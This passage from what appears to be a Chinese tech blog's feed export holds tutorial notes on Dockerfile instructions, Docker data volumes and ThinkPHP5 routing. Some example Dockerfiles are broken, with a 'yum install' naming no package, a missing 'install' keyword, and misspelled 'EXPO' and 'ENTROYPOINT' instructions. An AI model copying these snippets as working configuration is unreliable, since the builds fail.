<li><p><font color = gree>FROM</font><br>基础镜像，当前新镜像是基于哪个镜像的</p>
</li>
<li><p><font color = gree>MAINTAINER</font><br>镜像维护者的姓名和邮箱地址</p>
</li>
<li><p><font color = gree>RUN</font><br>容器构建时需要运行的命令</p>
</li>
<li><p><font color = gree>EXPOSE</font><br>当前容器对外暴露出的端口</p>
</li>
<li><p><font color = gree>WORKDIR</font><br>指定在创建容器后，终端默认登录的进来的工作目录，一个落脚点<br>举例：默认打开centos的目录为根目录”/“  ，就是WORKDIR指定的落脚点</p>
</li>
<li><p><font color = gree>ENV</font><br>用来在构建镜像过程中设置环境变量</p>
</li>
<li><p><font color = gree>ADD</font><br>将宿主机目录下的文件拷贝进镜像且ADD命令会自动处理URL和解压tar压缩包</p>
</li>
<li><p><font color = gree>COPY</font><br>类似ADD，拷贝文件和目录到镜像中。<br>将从构建上下文目录中&lt;源路径&gt;的文件/目录复制到新的–层的镜像内的&lt;目标路径&gt;位置<br>COPY src dest<br>COPY [“src”,”dest”]</p>
</li>
<li><p><font color = gree>VOLUME</font><br>容器数据卷，用于数据保存和持久化工作</p>
</li>
<li><p><font color = gree>CMD</font><br>指定一个容器启动时要运行的命令:<br>Dockerfile 中可以有多个CMD指令，但只有最后一个生效，CMD会被docker run之后的参数替换</p>
</li>
<li><p><font color = gree>ENTRYPOINT</font><br>指定一个容器启动时要运行的命令<br>ENTRYPOINT的目的和CMD一样，都是在指定容器启动程序及参数</p>
</li>
<li><p><font color = gree>ONBUILD</font><br>当构建一个被继承的Dockerfile时运行命令，父镜像在被子继承后父镜像的onbuild被触发</p>
</li>
</ul>
<h1 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a><font color = yellow>案例一</font></h1><ul>
<li><p><font color = gree>Base镜像(scratch)</font><br>DockerHub中99%的镜像都是通过在base<br>镜像中安装和配置需要的软件构建出来的</p>
</li>
<li><p><font color = gree>自定义镜像mycentos</font><br>1丶编写<br>Hub默认CentOS镜像什么情况   </p>
</li>
</ul>
<p>1.初始centos运行该镜像时默认路径是根<br>2.默认不支持vim<br>3.默认不支持ifconfig<br>准备编写DockerFile文件<br>myCentOS内容DockerFile<br>2丶构建<br>docker build -t 新镜像名字：TAG .<br>3丶运行<br>docker run -it<br>4丶列出镜像的变更历史<br>docker history 镜像ID</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOCKERFILE"><figure class="iseeu highlight /dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos                //设置基础镜像为centos</span><br><span class="line"><span class="keyword">MAINTAINER</span> yym&lt;yimingy72@gmail.com&gt;  //设置作者和作者邮箱</span><br><span class="line"><span class="keyword">ENV</span> mypath /tmp            //设置环境变量mypath为 /tmp</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> <span class="variable">$mypath</span>           //设置落脚点为 /tmp</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash">  yum  -y  install       //安装Vim </span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash">  yum  -y  net-tools    //安装net-tool   </span></span><br><span class="line">EXPO <span class="number">80</span>                    //设置运行端口</span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash              //设置运行命令</span></span><br></pre></td></tr></table></figure></div>
<h1 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a><font color = yellow>案例二</font></h1><h3 id="CMD-ENTRYPOINT镜像案例："><a href="#CMD-ENTRYPOINT镜像案例：" class="headerlink" title="CMD/ENTRYPOINT镜像案例："></a>CMD/ENTRYPOINT镜像案例：</h3><ul>
<li><p>都是指定一个容器启动时要运行的命令   </p>
</li>
<li><p>CMD<br>Dockerfile中可以有多个CMD指令，但只有最后一个生效，CMD会被docker run之后的参数替换<br>Case<br>tomcat的讲解演示    </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">docker run -it -p <span class="number">8888</span>:<span class="number">8080</span> tomcat ls -l</span><br></pre></td></tr></table></figure></div></li>
<li><p>ENTRYPOINT<br>docker run之后的参数会被当做参数传递给ENTRYPOINT，之后形成新的命令组合<br>Case<br>制作CMD版可以查询IP信息的容器<br>问题<br>WHY<br>制作ENTROYPOINT版查询IP信息的容器</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOCKERFILE"><figure class="iseeu highlight /dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum install -y curl               //安装curl命令</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">"curl"</span>,<span class="string">"-s"</span>,<span class="string">"http://ip.cn"</span>]         //查IP</span></span><br></pre></td></tr></table></figure></div>
<p>制作ENTROYPOINT版查询IP信息的容器,可以追加命令docker run myip -i返回文件头</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOCKERFILE"><figure class="iseeu highlight /dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum install -y curl               //安装curl命令</span></span><br><span class="line">ENTROYPOINT [<span class="string">"curl"</span>,<span class="string">"-s"</span>,<span class="string">"http://ip.cn"</span>]         //查IP</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>dockerfile创建数据卷</title>
    <url>/undefined/dockerfile%E5%88%9B%E5%BB%BA%E6%95%B0%E6%8D%AE%E5%8D%B7/</url>
    <content><![CDATA[<h1 id="DockerFile-创建数据卷"><a href="#DockerFile-创建数据卷" class="headerlink" title="DockerFile 创建数据卷"></a><font color=red>DockerFile 创建数据卷</font></h1><p>在 Dockerfile 中使用 Volume 指令来给镜像添加一个或多个数据卷。<br>语法格式：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOCKERFILE"><figure class="iseeu highlight /dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">VOLUME</span><span class="bash">[<span class="string">"/dataVolumeContainer1"</span>,<span class="string">"/dataVolumeContainer2"</span>]</span></span><br></pre></td></tr></table></figure></div>
<p>说明：<br>出于可移值和分享的考虑，用 -v 主机目录:容器目录 这种方法 不能够直接在Dockerfile中实现。  </p>
<p>由于宿主机目录是依赖于特定宿主机的，并不能保证在所有宿主机上都存在这样的特定目录。</p>
<h2 id="根目录下新建-mydocker-目录并进入"><a href="#根目录下新建-mydocker-目录并进入" class="headerlink" title="根目录下新建 mydocker 目录并进入"></a><font color = gree >根目录下新建 mydocker 目录并进入</font></h2><h3 id="终端container："><a href="#终端container：" class="headerlink" title="终端container：  "></a><font color = gree>终端container：  </font></h3><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CS"><figure class="iseeu highlight /cs"><table><tr><td class="code"><pre><span class="line">[<span class="meta">root@localhost /</span>]<span class="meta"># mkdir /mydocker</span></span><br><span class="line">[<span class="meta">root@localhost /</span>]<span class="meta"># cd mydocker/</span></span><br><span class="line">[<span class="meta">root@localhost mydocker</span>]<span class="meta"># pwd</span></span><br><span class="line">/mydocker</span><br><span class="line">[<span class="meta">root@localhost mydocker</span>]<span class="meta">#</span></span><br><span class="line">[<span class="meta">root@localhost mydocker</span>]<span class="meta"># vi Dockerfile</span></span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「xiaojin21cen」的原创文章，遵循CC <span class="number">4.0</span> BY-SA版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https:<span class="comment">//blog.csdn.net/xiaojin21cen/java/article/details/84501206</span></span><br></pre></td></tr></table></figure></div>
<h2 id="Dockerfile-："><a href="#Dockerfile-：" class="headerlink" title="Dockerfile ："></a><font color = gree>Dockerfile ：</font></h2><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOCKERFILE"><figure class="iseeu highlight /dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="comment"># volume test</span></span><br><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">"/dataVolumeContainer1"</span>,<span class="string">"/dataVolumeContainer2"</span>]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"finished,------success1"</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br></pre></td></tr></table></figure></div>
<p>说明：<br>上面的 Dockerfile 的内容 等价于</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">docker run -it -v <span class="string">/host1</span>:<span class="string">/dataVolumeContainer1</span> -v <span class="string">/host2</span>:<span class="string">/dataVolumeContainer2</span> centos <span class="string">/bin/bash</span></span><br></pre></td></tr></table></figure>
<h2 id="docker-build-：构建镜像"><a href="#docker-build-：构建镜像" class="headerlink" title="docker build ：构建镜像"></a><font color = gree>docker build ：构建镜像</font></h2><p>格式：  </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GRADLE"><figure class="iseeu highlight /gradle"><table><tr><td class="code"><pre><span class="line">docker build -f(<span class="keyword">file</span>容器卷) <span class="regexp">/mydocker/</span>Dockerfile -t zzyy<span class="regexp">/centos(镜像名) .</span></span><br></pre></td></tr></table></figure></div>
<p>注意，最后一位是个点（.）   </p>
<p>操作内容：   </p>
<p>终端container：   </p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DOCKERFILE"><figure class="iseeu highlight /dockerfile"><table><tr><td class="code"><pre><span class="line">[root@localhost mydocker]<span class="comment"># vi Dockerfile</span></span><br><span class="line">[root@localhost mydocker]<span class="comment"># ls</span></span><br><span class="line">Dockerfile</span><br><span class="line">[root@localhost mydocker]<span class="comment"># cat Dockerfile </span></span><br><span class="line"><span class="comment"># volume test</span></span><br><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">VOLUME</span><span class="bash"> [<span class="string">"/dataVolumeContainer1"</span>,<span class="string">"/dataVolumeContainer2"</span>]</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"finished,------success1"</span></span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br><span class="line">[root@localhost mydocker]<span class="comment"># docker build -f /mydocker/Dockerfile -t zzyy/centos .</span></span><br><span class="line">Sending build context to Docker daemon  <span class="number">2.048</span>kB</span><br><span class="line">Step <span class="number">1</span>/<span class="number">4</span> : <span class="keyword">FROM</span> centos</span><br><span class="line"> ---&gt; <span class="number">75835</span>a67d134</span><br><span class="line">Step <span class="number">2</span>/<span class="number">4</span> : <span class="keyword">VOLUME</span><span class="bash"> [<span class="string">"/dataVolumeContainer1"</span>,<span class="string">"/dataVolumeContainer2"</span>]</span></span><br><span class="line"> ---&gt; Running in <span class="number">041</span>cc7e7d58f</span><br><span class="line">Removing intermediate container <span class="number">041</span>cc7e7d58f</span><br><span class="line"> ---&gt; b49f99cf2001</span><br><span class="line">Step <span class="number">3</span>/<span class="number">4</span> : <span class="keyword">CMD</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"finished,------success1"</span></span></span><br><span class="line"> ---&gt; Running in <span class="number">2</span>e8ed8aedbff</span><br><span class="line">Removing intermediate container <span class="number">2</span>e8ed8aedbff</span><br><span class="line"> ---&gt; <span class="number">8</span>ec90a7d9d43</span><br><span class="line">Step <span class="number">4</span>/<span class="number">4</span> : <span class="keyword">CMD</span><span class="bash"> /bin/bash</span></span><br><span class="line"> ---&gt; Running in fb87df9d2666</span><br><span class="line">Removing intermediate container fb87df9d2666</span><br><span class="line"> ---&gt; <span class="number">1846</span>c594f7f9</span><br><span class="line">Successfully built <span class="number">1846</span>c594f7f9</span><br><span class="line">Successfully tagged zzyy/centos:latest</span><br><span class="line">[root@localhost mydocker]<span class="comment">#</span></span><br></pre></td></tr></table></figure></div>
<h3 id="查看镜像："><a href="#查看镜像：" class="headerlink" title="查看镜像：  "></a><font color = gree>查看镜像：  </font></h3><p>终端container：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost mydocker]# docker images</span><br><span class="line">REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE</span><br><span class="line">zzyy/centos         latest              <span class="number">1846</span>c594f7f9        <span class="number">42</span> seconds ago      <span class="number">200</span>MB</span><br><span class="line">atguigu/mytomcat    <span class="number">1.2</span>                 b105c1f52eb5        <span class="number">8</span> hours ago         <span class="number">463</span>MB</span><br><span class="line">redis               latest              c188f257942c        <span class="number">9</span> days ago          <span class="number">94.9</span>MB</span><br><span class="line">tomcat              latest              ca9e2fccef98        <span class="number">3</span> weeks ago         <span class="number">463</span>MB</span><br><span class="line">centos              latest              <span class="number">75835</span>a67d134        <span class="number">6</span> weeks ago         <span class="number">200</span>MB</span><br><span class="line">[<span class="symbol">root@</span>localhost mydocker]#</span><br></pre></td></tr></table></figure></div>
<h2 id="测试新构建的容器"><a href="#测试新构建的容器" class="headerlink" title="测试新构建的容器"></a><font color = gree>测试新构建的容器</font></h2><p>终端container：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">[<span class="symbol">root@</span>localhost mydocker]# docker run -it  zzyy/centos</span><br><span class="line">[<span class="symbol">root@</span><span class="number">299</span>d9be66cf2 /]# pwd</span><br><span class="line">/</span><br><span class="line">[<span class="symbol">root@</span><span class="number">299</span>d9be66cf2 /]# </span><br><span class="line">[<span class="symbol">root@</span><span class="number">299</span>d9be66cf2 /]# ll</span><br><span class="line">total <span class="number">12</span></span><br><span class="line">-rw-r--r--.   <span class="number">1</span> root root <span class="number">12030</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">15</span> anaconda-post.log</span><br><span class="line">lrwxrwxrwx.   <span class="number">1</span> root root     <span class="number">7</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">14</span> bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x.   <span class="number">2</span> root root     <span class="number">6</span> Nov <span class="number">25</span> <span class="number">10</span>:<span class="number">31</span> dataVolumeContainer1</span><br><span class="line">drwxr-xr-x.   <span class="number">2</span> root root     <span class="number">6</span> Nov <span class="number">25</span> <span class="number">10</span>:<span class="number">31</span> dataVolumeContainer2</span><br><span class="line">drwxr-xr-x.   <span class="number">5</span> root root   <span class="number">360</span> Nov <span class="number">25</span> <span class="number">10</span>:<span class="number">31</span> dev</span><br><span class="line">drwxr-xr-x.   <span class="number">1</span> root root    <span class="number">66</span> Nov <span class="number">25</span> <span class="number">10</span>:<span class="number">31</span> etc</span><br><span class="line">drwxr-xr-x.   <span class="number">2</span> root root     <span class="number">6</span> Apr <span class="number">11</span>  <span class="number">2018</span> home</span><br><span class="line">lrwxrwxrwx.   <span class="number">1</span> root root     <span class="number">7</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">14</span> lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx.   <span class="number">1</span> root root     <span class="number">9</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">14</span> lib64 -&gt; usr/lib64</span><br><span class="line">drwxr-xr-x.   <span class="number">2</span> root root     <span class="number">6</span> Apr <span class="number">11</span>  <span class="number">2018</span> media</span><br><span class="line">drwxr-xr-x.   <span class="number">2</span> root root     <span class="number">6</span> Apr <span class="number">11</span>  <span class="number">2018</span> mnt</span><br><span class="line">drwxr-xr-x.   <span class="number">2</span> root root     <span class="number">6</span> Apr <span class="number">11</span>  <span class="number">2018</span> opt</span><br><span class="line">dr-xr-xr-x. <span class="number">280</span> root root     <span class="number">0</span> Nov <span class="number">25</span> <span class="number">10</span>:<span class="number">31</span> proc</span><br><span class="line">dr-xr-x---.   <span class="number">2</span> root root   <span class="number">114</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">15</span> root</span><br><span class="line">drwxr-xr-x.  <span class="number">10</span> root root   <span class="number">130</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">15</span> run</span><br><span class="line">lrwxrwxrwx.   <span class="number">1</span> root root     <span class="number">8</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">14</span> sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x.   <span class="number">2</span> root root     <span class="number">6</span> Apr <span class="number">11</span>  <span class="number">2018</span> srv</span><br><span class="line">dr-xr-xr-x.  <span class="number">13</span> root root     <span class="number">0</span> Nov <span class="number">25</span> <span class="number">06</span>:<span class="number">17</span> sys</span><br><span class="line">drwxrwxrwt.   <span class="number">7</span> root root   <span class="number">132</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">15</span> tmp</span><br><span class="line">drwxr-xr-x.  <span class="number">13</span> root root   <span class="number">155</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">14</span> usr</span><br><span class="line">drwxr-xr-x.  <span class="number">18</span> root root   <span class="number">238</span> Oct  <span class="number">6</span> <span class="number">19</span>:<span class="number">14</span> var</span><br><span class="line">[<span class="symbol">root@</span><span class="number">299</span>d9be66cf2 /]#</span><br></pre></td></tr></table></figure></div>
<p>创建并运行容器后，发现自动创建了两个数据卷</p>
<h2 id="docker-inspect-查看容器数据卷"><a href="#docker-inspect-查看容器数据卷" class="headerlink" title="docker inspect 查看容器数据卷"></a><font color = gree >docker inspect 查看容器数据卷</font></h2><p>查找对应的主机目录地址。</p>
<p>方法：docker inspect 容器id</p>
<p>终端test：<br>查找宿主机的目录地址</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">[root@localhost /]# docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS               NAMES</span><br><span class="line">299d9be66cf2        zzyy/centos         <span class="string">"/bin/sh -c /bin/bash"</span>   3 minutes ago       Up 3 minutes                            gifted_fermat</span><br><span class="line">[root@localhost /]# docker inspect 299d9be66cf2</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span>省略<span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">        <span class="string">"Mounts"</span>: [</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"Type"</span>: <span class="string">"volume"</span>,</span><br><span class="line">                <span class="string">"Name"</span>: <span class="string">"ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941"</span>,</span><br><span class="line">                <span class="string">"Source"</span>: <span class="string">"/var/lib/docker/volumes/ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941/_data"</span>,</span><br><span class="line">                <span class="string">"Destination"</span>: <span class="string">"/dataVolumeContainer1"</span>,</span><br><span class="line">                <span class="string">"Driver"</span>: <span class="string">"local"</span>,</span><br><span class="line">                <span class="string">"Mode"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="string">"RW"</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">"Propagation"</span>: <span class="string">""</span></span><br><span class="line">            &#125;,</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="string">"Type"</span>: <span class="string">"volume"</span>,</span><br><span class="line">                <span class="string">"Name"</span>: <span class="string">"d668bc0dfbc64f722fae55f4986c3417eb88850ab62e2e50aef9b50f31bad37c"</span>,</span><br><span class="line">                <span class="string">"Source"</span>: <span class="string">"/var/lib/docker/volumes/d668bc0dfbc64f722fae55f4986c3417eb88850ab62e2e50aef9b50f31bad37c/_data"</span>,</span><br><span class="line">                <span class="string">"Destination"</span>: <span class="string">"/dataVolumeContainer2"</span>,</span><br><span class="line">                <span class="string">"Driver"</span>: <span class="string">"local"</span>,</span><br><span class="line">                <span class="string">"Mode"</span>: <span class="string">""</span>,</span><br><span class="line">                <span class="string">"RW"</span>: <span class="literal">true</span>,</span><br><span class="line">                <span class="string">"Propagation"</span>: <span class="string">""</span></span><br><span class="line">            &#125;</span><br><span class="line">        ],</span><br><span class="line"><span class="built_in">..</span><span class="built_in">..</span>省略<span class="built_in">..</span><span class="built_in">..</span></span><br><span class="line">[root@localhost /]#</span><br></pre></td></tr></table></figure></div>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CRYSTAL"><figure class="iseeu highlight /crystal"><table><tr><td class="code"><pre><span class="line">在节点Mounts节点中已经给出了宿主机的目录地址</span><br><span class="line">/var/<span class="class"><span class="keyword">lib</span>/<span class="title">docker</span>/<span class="title">volumes</span>/<span class="title">ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941</span>/<span class="title">_data</span> 对应的是 /<span class="title">dataVolumeContainer1</span></span></span><br><span class="line">/var/<span class="class"><span class="keyword">lib</span>/<span class="title">docker</span>/<span class="title">volumes</span>/<span class="title">d668bc0dfbc64f722fae55f4986c3417eb88850ab62e2e50aef9b50f31bad37c</span>/<span class="title">_data</span> 对应的是 /<span class="title">dataVolumeContainer2</span></span></span><br></pre></td></tr></table></figure></div>
<h2 id="主机对应默认地址"><a href="#主机对应默认地址" class="headerlink" title="主机对应默认地址"></a><font color = gree>主机对应默认地址</font></h2><p>终端container：<br>进入 dataVolumeContainer1 中，编辑 container.txt</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="TCL"><figure class="iseeu highlight /tcl"><table><tr><td class="code"><pre><span class="line">[root@<span class="number">299</span>d9be66cf2 /]# ls</span><br><span class="line">anaconda-post.log  dataVolumeContainer1  dev  home  lib64  mnt  <span class="keyword">proc</span><span class="title">  run</span> <span class="title">  srv</span> <span class="title"> tmp</span> <span class="title"> var</span></span><br><span class="line"><span class="title">bin</span> <span class="title">               dataVolumeContainer2</span> <span class="title"> etc</span> <span class="title"> lib</span> <span class="title">  media</span> <span class="title"> opt</span> <span class="title"> root</span> <span class="title"> sbin</span> <span class="title"> sys</span> <span class="title"> usr</span></span><br><span class="line"><span class="title">[root@299d9be66cf2</span> /]#<span class="title"> cd</span> dataVolumeContainer1/</span><br><span class="line">[root@299d9be66cf2<span class="title"> dataVolumeContainer1]#</span> ls</span><br><span class="line">[root@299d9be66cf2<span class="title"> dataVolumeContainer1]#</span> echo "container<span class="title"> add"&gt;</span> container.txt</span><br><span class="line">[root@299d9be66cf2<span class="title"> dataVolumeContainer1]#</span> cat<span class="title"> container.txt</span> </span><br><span class="line">container<span class="title"> add</span></span><br><span class="line"><span class="title">[root@299d9be66cf2</span> dataVolumeContainer1]#</span><br></pre></td></tr></table></figure></div>
<p>终端host：<br>进入/var/lib/docker/volumes/ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941/_data 目录中：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="CS"><figure class="iseeu highlight /cs"><table><tr><td class="code"><pre><span class="line">[<span class="meta">root@localhost /</span>]<span class="meta"># cd /var/lib/docker/volumes/ebecb97f356f449783bd9898ebd2c6b31559fb58fff5981350dc7fd4fe1d0941/_data</span></span><br><span class="line">[<span class="meta">root@localhost _data</span>]<span class="meta"># ls</span></span><br><span class="line">container.txt</span><br><span class="line">[<span class="meta">root@localhost _data</span>]<span class="meta"># cat container.txt </span></span><br><span class="line">container <span class="keyword">add</span></span><br><span class="line">[<span class="meta">root@localhost _data</span>]<span class="meta">#</span></span><br></pre></td></tr></table></figure></div>




<h1 id="数据卷的继承（继承之后各个容器共享数据卷）"><a href="#数据卷的继承（继承之后各个容器共享数据卷）" class="headerlink" title="数据卷的继承（继承之后各个容器共享数据卷）"></a><font color=red>数据卷的继承（继承之后各个容器共享数据卷）</font></h1><p>使用同一个镜像创建容器<br>假设之前已经使用dockerfile创建的镜像创建了一个容器dc-01<br>1丶创建容器继承dc-01数据卷</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ANGELSCRIPT"><figure class="iseeu highlight /angelscript"><table><tr><td class="code"><pre><span class="line">docker run -it --name dc<span class="number">-02</span> --volumes-<span class="keyword">from</span> dc<span class="number">-01</span> dockerfile/centos</span><br></pre></td></tr></table></figure></div>
<p>此时在对应的容器卷文件夹下已经可以共享文件了；dc-02创建的文件dc-1也能读写</p>
]]></content>
      <categories>
        <category>docker</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>18.thinkphp5资源路由和快捷路由</title>
    <url>/undefined/18.thinkphp5%E8%B5%84%E6%BA%90%E8%B7%AF%E7%94%B1%E5%92%8C%E5%BF%AB%E6%8D%B7%E8%B7%AF%E7%94%B1/</url>
    <content><![CDATA[<h1 id="一丶资源路由和快捷路由"><a href="#一丶资源路由和快捷路由" class="headerlink" title="一丶资源路由和快捷路由"></a><font color=red>一丶资源路由和快捷路由</font></h1><h1 id="1丶资源路由"><a href="#1丶资源路由" class="headerlink" title="1丶资源路由"></a><font color=green>1丶资源路由</font></h1><p>5.0支持设置 RESTFu1请求的资源路由，方式如下:</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line"><span class="string">Route:</span>resource（<span class="string">'blog'</span>,<span class="string">'index/blog'</span>）</span><br></pre></td></tr></table></figure></div>
<p>或者在路由配置文件中使用<strong>rest</strong>添加资源路由定义：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="DART"><figure class="iseeu highlight /dart"><table><tr><td class="code"><pre><span class="line"><span class="keyword">return</span>[</span><br><span class="line">    <span class="comment">//定义资源路由</span></span><br><span class="line">    <span class="string">'__rest__'</span>=&gt;[</span><br><span class="line">        <span class="comment">//指向index模块的blog控制器</span></span><br><span class="line">        <span class="string">'blog'</span>=&gt;<span class="string">'index/blog'</span>,</span><br><span class="line">    ]</span><br><span class="line">]</span><br></pre></td></tr></table></figure></div>
<p>设置过后会自动注册7个路由规则，如下：<br><img src="https://i.imgur.com/B6I8AzU.png" alt="1"><br>具体指向的控制器由路由地址决定，例如上面的设置，会对应 index模块的blog控制器，你只需要为Blog控制器创建以上对应的操作方法就可以支持下面的URL访问：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="AWK"><figure class="iseeu highlight /awk"><table><tr><td class="code"><pre><span class="line">http:<span class="regexp">//</span>serverName<span class="regexp">/blog/</span></span><br><span class="line">http:<span class="regexp">//</span>serverName<span class="regexp">/blog/</span><span class="number">128</span></span><br><span class="line">http:<span class="regexp">//</span>serverName<span class="regexp">/blog/</span><span class="number">28</span><span class="regexp">/edit</span></span><br></pre></td></tr></table></figure></div>
<p>Blog控制器中对应的方法如下：<br><img src="https://i.imgur.com/zXL2LmW.png" alt="1"></p>
<h1 id="2丶快捷路由"><a href="#2丶快捷路由" class="headerlink" title="2丶快捷路由"></a><font color=green>2丶快捷路由</font></h1><p>快捷路由允许你快速给控制器注册路由，并且针对不同的请求类型可以设置方法前缀，例如：</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="GROOVY"><figure class="iseeu highlight /groovy"><table><tr><td class="code"><pre><span class="line"><span class="comment">//给User控制器设置快捷路由</span></span><br><span class="line"><span class="string">Route:</span>:controller(<span class="string">'user'</span>,<span class="string">'index/User'</span>);</span><br></pre></td></tr></table></figure></div>
<p>User控制器定义如下：<br><img src="https://i.imgur.com/6a8Efg1.png" alt="1"><br>我们可以通过下面的URL访问</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PGSQL"><figure class="iseeu highlight /pgsql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">get</span> http://localhost/<span class="keyword">user</span>/<span class="keyword">info</span></span><br><span class="line"><span class="keyword">get</span> http://localhost/<span class="keyword">user</span>/phone</span><br><span class="line">post http://localhost/<span class="keyword">user</span>/<span class="keyword">info</span></span><br><span class="line">put http://localhost/<span class="keyword">user</span>/<span class="keyword">info</span></span><br><span class="line"><span class="keyword">delete</span> http://loaclhost/<span class="keyword">user</span>/<span class="keyword">info</span></span><br></pre></td></tr></table></figure></div>

]]></content>
      <categories>
        <category>thinkphp5</category>
      </categories>
      <tags>
        <tag>thinkphp5</tag>
      </tags>
  </entry>
  <entry>
    <title>17.thinkphp5路由之路由注册</title>
    <url>/undefined/17.thinkphp5%E8%B7%AF%E7%94%B1%E4%B9%8B%E8%B7%AF%E7%94%B1%E6%B3%A8%E5%86%8C/</url>
